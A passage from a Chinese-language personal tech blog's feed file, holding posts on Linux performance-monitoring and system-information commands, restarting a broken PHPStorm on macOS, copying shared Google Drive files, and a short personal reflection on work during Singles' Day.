的线程和性能。它能让你实时查看数据库以及正在处理哪些查询</td><td>mytop</td></tr><tr><td>iftop</td><td>用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等</td><td>iftop</td></tr><tr><td>jnettop</td><td>以相同的方式来监测网络流量但比 iftop 更形象。它还支持自定义的文本输出，并能以友好的交互方式来深度分析日志</td><td>jnettop</td></tr><tr><td>ngrep</td><td>网络层的 grep。它使用 pcap ，允许通过指定扩展正则表达式或十六进制表达式来匹配数据包</td><td>ngrep</td></tr><tr><td>nmap</td><td>可以扫描你服务器开放的端口并且可以检测正在使用哪个操作系统</td><td>nmap localhost</td></tr><tr><td>du</td><td>查看Linux系统中某目录的大小</td><td>du -sh *</td></tr><tr><td>fdisk</td><td>查看硬盘及分区信息</td><td>fdisk -l</td></tr></tbody></table><h2 id="内存监控"><a href="#内存监控" class="headerlink" title="内存监控"></a>内存监控</h2><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free</code>命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free (选项)</span><br></pre></td></tr></table></figure><p>常用选项：<br><code>-b</code>：以Byte为单位显示内存使用情况；<br><code>-k</code>：以KB为单位显示内存使用情况；<br><code>-m</code>：以MB为单位显示内存使用情况；<br><code>-g</code>：以GB为单位显示内存使用情况;<br><code>-o</code>：不显示缓冲区调节列；<br><code>-t</code>：显示内存总和列；<br><code>-V</code>：显示版本信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201117222535.png" alt=""></p><p>字段说明：</p><ul><li>total：内存总数；</li><li>used：已经使用的内存数，包括 cached 和应用程序实际使用的内存；</li><li>free：空闲的内存数；</li><li>shared：当前已经废弃不用；</li><li>buffers：缓存内存数；</li><li>cached：缓存内存数。</li></ul><p>关系：total = used + free</p><h3 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h3><p>vmstat命令 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。</p><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmstat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项<br><code>-a</code>：显示活动内页；<br><code>-f</code>：显示启动后创建的进程总数；<br><code>-m</code>：显示slab信息；<br><code>-n</code>：头信息仅显示一次；<br><code>-s</code>：以表格方式显示事件计数器和内存状态；<br><code>-d</code>：报告磁盘状态；<br><code>-p</code>：显示指定的硬盘分区状态；<br><code>-S</code>：输出信息的单位。</p><p>参数</p><ul><li>事件间隔：状态信息刷新的时间间隔；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201117223922.png" alt=""></p><p>字段说明：<br>Procs（进程）</p><ul><li>r: 运行和等待CPU时间片的进程数，这个值如果长期大于系统CPU个数，就说明CPU资源不足，可以考虑增加CPU </li><li>b: 等待资源的进程数，比如正在等待I/O或者内存交换等</li></ul><p>Memory（内存）</p><ul><li>swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。</li><li>free: 空闲物理内存大小（以KB为单位）。</li><li>buff: 用作缓冲的内存大小。</li><li>cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多。如果此时IO中的bi比较小，就说明文件系统效率比较好。</li></ul><p>Swap</p><ul><li>si: 每秒从交换区写到内存的大小，由磁盘调入内存。</li><li>so: 每秒写入交换区的内存大小，由内存调入磁盘。</li></ul><p>注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。</p><p>IO（现在的Linux版本块的大小为1kb）</p><ul><li>bi: 每秒读取的块数</li><li>bo: 每秒写入的块数</li></ul><p>注意：随机磁盘读写的时候，这2个值较大（如超出1024k)，而且wa值比较大，则表示系统磁盘IO性能瓶颈。</p><p>system（系统）</p><ul><li>in: 每秒中断数，包括时钟中断。</li><li>cs: 每秒上下文切换数。</li></ul><p>注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。</p><p>CPU（以百分比表示）<br>us: 用户进程执行时间百分比(user time)<br>us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。</p><ul><li>sy: 内核系统进程执行时间百分比(system time)<br>sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。</li><li>id: 空闲时间百分比</li><li>wa: IO等待时间百分比<br>wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。</li><li>st：一般不关注，虚拟机占用的时间百分比。</li></ul><h2 id="CPU-监控"><a href="#CPU-监控" class="headerlink" title="CPU 监控"></a>CPU 监控</h2><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>top命令 可以实时动态地查看系统的整体运行情况。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top (选项)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-b</code>：以批处理模式操作；<br><code>-c</code>：显示完整的治命令；<br><code>-d</code>：屏幕刷新间隔时间；<br><code>-I</code>：忽略失效过程；<br><code>-s</code>：保密模式；<br><code>-S</code>：累积模式；<br><code>-i&lt;时间&gt;</code>：设置间隔时间；<br><code>-u&lt;用户名&gt;</code>：指定用户名；<br><code>-p&lt;进程号&gt;</code>：指定进程；<br><code>-n&lt;次数&gt;</code>：循环显示的次数。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118231037.png" alt=""></p><p>字段说明：</p><ul><li><code>top</code>：系统当前时间</li><li><code>up xxx days</code>：系统运行时间</li><li><code>1 users</code>：当前登录用户个数</li><li><code>load average</code>：系统负载。即任务队列的平均长度。三个数值分别为最近1分钟、最近5分钟、最近15分钟的平均负载。——超过N（CPU核数）说明系统满负荷运行。</li><li>Tasks<ul><li><code>total</code>：总进程数</li><li><code>running</code>：正在运行的进程数</li><li><code>sleeping</code>：睡眠的进程数</li><li><code>stopped</code>：停止的进程数</li><li><code>zombie</code>：冻结的进程数</li></ul></li><li>%Cpu(s)<ul><li><code>us</code>：用户进程消耗的CPU百分比</li><li><code>sy</code>：内核进程消耗的CPU百分比</li><li><code>ni</code>：改变过优先级的进程占用CPU的百分比</li><li><code>id</code>：空闲CPU的百分比</li><li><code>wa</code>：IO等待消耗的CPU百分比</li></ul></li><li>Mem<ul><li><code>total</code>：物理内存总量</li><li><code>free</code>：空闲物理内存总量</li><li><code>used</code>：已用物理内存总量</li><li><code>buff</code>：用作内核缓存内存总量</li></ul></li><li>Swap<ul><li><code>total</code>：虚拟内存总量</li><li><code>free</code>：空闲虚拟内存总量</li><li><code>used</code>：已用虚拟内存总量</li></ul></li></ul><h3 id="mpstat"><a href="#mpstat" class="headerlink" title="mpstat"></a>mpstat</h3><p>mpstat命令 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mpstat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-P：指定CPU编号。</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>间隔时间：每次报告的间隔时间（秒）；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118232333.png" alt=""></p><p>ALL表示显示所有CPUs，也可以指定某个CPU；2表示刷新间隔。</p><h2 id="网络监控"><a href="#网络监控" class="headerlink" title="网络监控"></a>网络监控</h2><h3 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h3><p>sar命令 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118232850.png" alt=""></p><p>字段说明：</p><ul><li><code>IFACE</code>：网络设备的名称</li><li><code>rxpck/s</code>：每秒钟接收到的包数目</li><li><code>txpck/s</code>：每秒钟发送出去的包数目</li><li><code>rxkB/s</code>：每秒钟接收到的字节数</li><li><code>txkB/s</code>：每秒钟发送出去的字节数</li></ul><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>netstat命令一般用于检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据。</p><p>常用实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -aup      # 输出所有UDP连接状况</span><br><span class="line">netstat -atp      # 输出所有TCP连接状况</span><br><span class="line">netstat -s        # 显示各个协议的网络统计信息</span><br><span class="line">netstat -i        # 显示网卡列表</span><br><span class="line">netstat -r        # 显示路由表信息</span><br><span class="line">netstat -l        # 只显示监听端口</span><br><span class="line">netstat -lt       # 只列出所有监听 tcp 端口</span><br><span class="line">netstat -lu       # 只列出所有监听 udp 端口</span><br><span class="line">netstat -lx       # 只列出所有监听 UNIX 端口</span><br></pre></td></tr></table></figure><h2 id="磁盘监控"><a href="#磁盘监控" class="headerlink" title="磁盘监控"></a>磁盘监控</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><p>df命令 用于显示磁盘分区上的可使用的磁盘空间。如果没有文件名被指定，则显示当前所有被挂载的文件系统，默认以 KB 为单位。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-a</code>  全部文件系统列表<br><code>-h</code>  以方便阅读的方式显示<br><code>-i</code>  显示inode信息<br><code>-T</code>  显示文件系统类型<br><code>-l</code>  只显示本地文件系统<br><code>-k</code>  以KB为单位<br><code>-m</code>  以MB为单位</p><p>参数：</p><ul><li>文件：指定文件系统上的文件。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201118234529.png" alt=""></p><h3 id="iostat"><a href="#iostat" class="headerlink" title="iostat"></a>iostat</h3><p>iostat命令 被用于监视系统输入输出设备和CPU的使用情况。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iostat (选项) (参数)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-c</code>：仅显示CPU使用情况；<br><code>-d</code>：仅显示设备利用率；<br><code>-k</code>：显示状态以千字节每秒为单位，而不使用块每秒；<br><code>-m</code>：显示状态以兆字节每秒为单位；<br><code>-p</code>：仅显示块设备和所有被使用的其他分区的状态；<br><code>-t</code>：显示每个报告产生时的时间；<br><code>-V</code>：显示版号并退出；<br><code>-x</code>：显示扩展状态。</p><p>参数：</p><ul><li>间隔时间：每次报告的间隔时间（秒）；</li><li>次数：显示报告的次数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201119221611.png" alt=""></p><p>字段说明：</p><ul><li><code>r/s</code>: 每秒完成的读 I/O 设备次数。</li><li><code>w/s</code>: 每秒完成的写 I/O 设备次数。</li><li><code>rkB/s</code>: 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节。</li><li><code>wkB/s</code>: 每秒写K字节数.是 wsect/s 的一半。</li><li><code>avgrq-sz</code>: 平均每次设备I/O操作的数据大小 (扇区)。</li><li><code>avgqu-sz</code>: 平均I/O队列长度。</li><li><code>await</code>: 平均每次设备I/O操作的等待时间 (毫秒)。</li><li><code>svctm</code>: 平均每次设备I/O操作的服务时间 (毫秒)。</li><li><code>%util</code>: 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的。</li></ul><h3 id="iotop"><a href="#iotop" class="headerlink" title="iotop"></a>iotop</h3><p>iotop命令 是一个用来监视磁盘I/O使用状况的top类工具。</p><p>iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iotop (选项)</span><br></pre></td></tr></table></figure><p>选项：<br><code>-o</code>：只显示有io操作的进程<br><code>-b</code>：批量显示，无交互，主要用作记录到文件。<br><code>-n</code>： NUM：显示NUM次，主要用于非交互式模式。<br><code>-d SEC</code>：间隔SEC秒显示一次。<br><code>-p PID</code>：监控的进程pid。<br><code>-u USER</code>：监控的进程用户。</p><p>iotop常用快捷键：</p><ul><li>左右箭头：改变排序方式，默认是按IO排序。</li><li>r：改变排序顺序。</li><li>o：只显示有IO输出的进程。</li><li>p：进程/线程的显示方式的切换。</li><li>a：显示累积使用量。</li><li>q：退出。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201119221830.png" alt=""></p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>ps（Process Status，进程状态）命令 用于报告当前系统的进程状态。</p><p>ps 的用法非常多，这里仅列举一些常用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep &lt;name&gt;      # 查看name 进程详细信息</span><br><span class="line">ps -p &lt;pid&gt; -L             # 显示进程&lt;pid&gt; 的所有线程</span><br><span class="line">ps -o lstart &lt;pid&gt;         # 显示进程的启动时间</span><br><span class="line">ps -f --forest -C &lt;name&gt;   # 用树的风格显示进程的层次关系</span><br><span class="line">ps -e -o pid,uname,pcpu,pmem,comm,etime  # 定制显示的列</span><br><span class="line">ps -o lstart &lt;pid&gt;         # 显示进程的启动时间</span><br></pre></td></tr></table></figure><h2 id="系统监控全能工具"><a href="#系统监控全能工具" class="headerlink" title="系统监控全能工具"></a>系统监控全能工具</h2><h3 id="glances"><a href="#glances" class="headerlink" title="glances"></a>glances</h3><p>glances 是一个用来监视 GNU/Linux 和 FreeBSD 操作系统的 GPL 授权的全能工具。</p><p>Glances 会用一下几种颜色来代表状态：</p><ul><li>绿色：OK（一切正常） </li><li>蓝色：CAREFUL（需要注意） </li><li>紫色：WARNING（警告） </li><li>红色：CRITICAL（严重）。</li></ul><p>阀值可以在配置文件中设置，一般阀值被默认设置为（careful=50、warning=70、critical=90）。</p><h3 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h3><p>dstat命令 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具。</p><p>直接使用dstat，默认使用的是-cdngy参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://wzfou.com/linux-jiankong/" target="_blank" rel="noopener">Linux系统监控命令整理汇总-掌握CPU,内存,磁盘IO等找出性能瓶颈</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 下IDEA 无法正常启动</title>
      <link href="/idea-cannot-start-normally-under-mac/"/>
      <url>/idea-cannot-start-normally-under-mac/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天本来打算使用<code>PHPStorm</code>的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。</p><a id="more"></a><p>因为使用的<code>PHPStorm</code>是破解的，所以我以为是失效了。<br>就在我一筹莫展准备重装一遍的，突然想起”要不试试通过命令行启动“？</p><p>于是我找到<code>PHPStrom</code>的包文件之后，尝试通过命令行启动，虽然同样失败了，但是命令行输出了一些信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/4DDACB7F-B42E-4142-8C20-F7DF8E450D53.png" alt=""></p><p>正是这些信息，才让我想起来，今天上午在整理文件时，不小心把<code>PHPStorm</code>中依赖的一个文件给删除掉了。</p><p>于是，马上找到了那个文件并还原了，之后果然能正常启动了。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果你也遇到了类似的情况，那么可以尝试这种方式，或许能帮助你找到问题所在。</p><ol><li>找到应用程序</li><li>右键显示包文件</li><li>依次进入<code>Contents-&gt;MacOS</code></li><li>双击<code>shell</code>脚本</li></ol><p>接着无论成功或失败都能输出一些内容，然后利用这些内容去查找问题所在。</p>]]></content>
      
      
      <categories>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Drive 如何转存文件？</title>
      <link href="/how-does-google-drive-transfer-files/"/>
      <url>/how-does-google-drive-transfer-files/</url>
      
        <content type="html"><![CDATA[<p>对于初次使用<a href="https://www.google.com/drive/" target="_blank" rel="noopener">Google Drive</a>（以下简称 GD）的同学来说，可能会有以下几点困惑。</p><a id="more"></a><ol><li>大家常说的转存是什么意思？</li><li>常见的转存方式有哪几种？</li></ol><p>在正式回答上面两个问题之前，先来了解一下GD。</p><p>GD 是Google 在2012 年4 月24 日推出的一个在线同步存储服务，类似百度的百度网盘，不过不同之处在于GD 不会限速。普通用户默认的存储空间是15 GB。</p><p>用户可以将其他用户分享的文件添加到“我的云端硬盘”，这种方式并不会占用用户的存储空间，这个操作相当于是在“我的云端硬盘”中创建了一个<strong>软链接</strong>，可以快速访问该文件，而文件所有者则还是<strong>分享者</strong>，如果原作者删除了，那么你网盘里的也会消失。</p><p>所以为了解决上述问题，转存的概念便诞生了，它存在的意义是将其他用户分享的文件保存至自己的云盘，类似百度网盘的“保存到我的网盘”功能。</p><p>但有所不同的是，如果<strong>分享者</strong>没有开放权限，那么其他用户则无权转存。</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>在需要转存的文件上，点击右键，制作一个拷贝，拷贝的文件位于“我的云端硬盘”中。</p><p>第一种方式最简单，适用于小文件，不能对文件夹进行 Copy 操作。</p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p><a href="https://softgateon.herokuapp.com/urltodrive/" target="_blank" rel="noopener">Copy, URL to Google Drive</a> 是一个云端硬盘插件。</p><p>在目标文件上点击右键，选择打开方式，关联更多应用。</p><p>搜索Copy, URL to Google Drive 进行安装。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201113214943.png" alt=""></p><p>安装完成之后，还需要进行Google 账号授权才能进行转存操作。</p><p>在需要转存的文件夹上 右键-打开方式-Copy, URL to Google Drive，之后点击 Save, Copy to Google Drive，就可以看见正在转存了，如果文件较大时间会比较久。</p><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><p>在Telegram 上有人开发了一个机器人（@GoogleDriveManagerBot），专门用于GD 文件转存。</p><p>该机器人可以实现谷歌网盘资源转存以及网盘内资源批量重命名，普通用户仅可绑定一个 GD 账号。<br>通过简单的命令即可对文件进行转存。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>方式一最简单，门槛最低，即使在没有权限的情况下，也能进行Copy 操作，但是效率很低。</p><p>方式二、三省事，效率高，但前提是得有权限。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.jianshu.com/p/42f323bd15ef" target="_blank" rel="noopener">一个方便转存 Google Drive 分享文件的方法</a></li><li><a href="https://blog.curlc.com/archives/569.html" target="_blank" rel="noopener">转存Google Drive资源到自己的Google Drive</a></li><li><a href="https://blog.frytea.com/archives/31/" target="_blank" rel="noopener">Linux 下使用 rclone 挂载网盘到本地</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Google Drive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>互联网人的双十一</title>
      <link href="/double-eleven-for-internet-people/"/>
      <url>/double-eleven-for-internet-people/</url>
      
        <content type="html"><![CDATA[<p>我其实不太会去写这类文章，那为什么要写这篇文章呢？<br>想抓住双十一的尾巴，记录一些想法。</p><a id="more"></a><p>今年的双十一我本来也是啥都没买，</p><p>可就在晚上七点左右，线上的某个平台，出了一点问题，订单的盈亏跟用户的余额对不上。<br>经过一番排查发现是因为处理订单的那个脚本不知为何特别慢，导致大量订单全部堆积在一起了。</p><p>因为一些历史包袱的原因，在处理方式上我是知道这个脚本存在一些隐患的。<br>同事提议不如这个脚本让他去用Node.js 写吧，尽管很不情愿，但也没办法。</p><p>想在仔细回想，当时那种感觉还是很清晰，我真的不喜欢那种能被替代的感觉，那一瞬间觉得所有的娱乐活动都没有意思了，只有把技术才是唯一的热爱。</p><p>晚上回家之后，第一件事应该是练吉他，但昨天似乎也没啥心思练了。</p><p>今年本来就没少为知识付费，视频课程，电子书籍，纸质书籍各种学习资料。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201112083115.png" alt=""></p><p>然后昨天晚上又在慕课网上买了三门实战课程，真的不想做一个Cruder，这是我最后的倔强了。</p><p>在如今这个互联网高速发展的时代，我想学习以及需要学习的东西真的是太多了，真的是学的越多，才发现自己懂的真的好少。</p><p>最后想说的是，希望自己能保持住这份初心，继续加油。</p>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 查看系统、硬件信息</title>
      <link href="/linux-view-system-and-hardware-information/"/>
      <url>/linux-view-system-and-hardware-information/</url>
      
        <content type="html"><![CDATA[<p>以下命令都是基于Ubuntu。</p><a id="more"></a><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><h4 id="查看内核-操作系统-CPU信息"><a href="#查看内核-操作系统-CPU信息" class="headerlink" title="查看内核/操作系统/CPU信息"></a>查看内核/操作系统/CPU信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br></pre></td></tr></table></figure><h4 id="查看操作系统版本"><a href="#查看操作系统版本" class="headerlink" title="查看操作系统版本"></a>查看操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ head -n 1 &#x2F;etc&#x2F;issue</span><br></pre></td></tr></table></figure><h4 id="查看机器型号"><a href="#查看机器型号" class="headerlink" title="查看机器型号"></a>查看机器型号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dmidecode | grep &quot;Product Name&quot;</span><br></pre></td></tr></table></figure><h4 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hostname</span><br></pre></td></tr></table></figure><h4 id="列出所有PCI设备"><a href="#列出所有PCI设备" class="headerlink" title="列出所有PCI设备"></a>列出所有PCI设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lspci -tv</span><br></pre></td></tr></table></figure><h4 id="列出所有USB设备"><a href="#列出所有USB设备" class="headerlink" title="列出所有USB设备"></a>列出所有USB设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsusb -tv</span><br></pre></td></tr></table></figure><h4 id="列出加载的内核模块"><a href="#列出加载的内核模块" class="headerlink" title="列出加载的内核模块"></a>列出加载的内核模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lsmod</span><br></pre></td></tr></table></figure><h4 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ env</span><br></pre></td></tr></table></figure><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><h4 id="查看内存使用量和交换区使用量"><a href="#查看内存使用量和交换区使用量" class="headerlink" title="查看内存使用量和交换区使用量"></a>查看内存使用量和交换区使用量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ free -m</span><br></pre></td></tr></table></figure><h4 id="查看各分区使用情况"><a href="#查看各分区使用情况" class="headerlink" title="查看各分区使用情况"></a>查看各分区使用情况</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><h4 id="查看总内存量"><a href="#查看总内存量" class="headerlink" title="查看总内存量"></a>查看总内存量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep MemTotal &#x2F;proc&#x2F;meminfo</span><br></pre></td></tr></table></figure><h4 id="查看空闲内存量"><a href="#查看空闲内存量" class="headerlink" title="查看空闲内存量"></a>查看空闲内存量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep MemFree &#x2F;proc&#x2F;meminfo</span><br></pre></td></tr></table></figure><h4 id="查看系统运行时间、用户数、负载"><a href="#查看系统运行时间、用户数、负载" class="headerlink" title="查看系统运行时间、用户数、负载"></a>查看系统运行时间、用户数、负载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uptime</span><br></pre></td></tr></table></figure><h4 id="查看系统负载"><a href="#查看系统负载" class="headerlink" title="查看系统负载"></a>查看系统负载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;loadavg</span><br></pre></td></tr></table></figure><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><h4 id="查看CPU-统计信息"><a href="#查看CPU-统计信息" class="headerlink" title="查看CPU 统计信息"></a>查看CPU 统计信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu</span><br></pre></td></tr></table></figure><h4 id="查看单个CPU-信息"><a href="#查看单个CPU-信息" class="headerlink" title="查看单个CPU 信息"></a>查看单个CPU 信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure><h3 id="磁盘和分区"><a href="#磁盘和分区" class="headerlink" title="磁盘和分区"></a>磁盘和分区</h3><h4 id="查看磁盘空间信息"><a href="#查看磁盘空间信息" class="headerlink" title="查看磁盘空间信息"></a>查看磁盘空间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><h4 id="查看挂接的分区状态"><a href="#查看挂接的分区状态" class="headerlink" title="查看挂接的分区状态"></a>查看挂接的分区状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | column -t</span><br></pre></td></tr></table></figure><h4 id="查看所有分区"><a href="#查看所有分区" class="headerlink" title="查看所有分区"></a>查看所有分区</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ fdisk -l</span><br></pre></td></tr></table></figure><h4 id="查看所有交换分区"><a href="#查看所有交换分区" class="headerlink" title="查看所有交换分区"></a>查看所有交换分区</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ swapon -s</span><br></pre></td></tr></table></figure><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><h4 id="查看所有网络接口的属性"><a href="#查看所有网络接口的属性" class="headerlink" title="查看所有网络接口的属性"></a>查看所有网络接口的属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig</span><br></pre></td></tr></table></figure><h4 id="查看防火墙设置"><a href="#查看防火墙设置" class="headerlink" title="查看防火墙设置"></a>查看防火墙设置</h4><figure 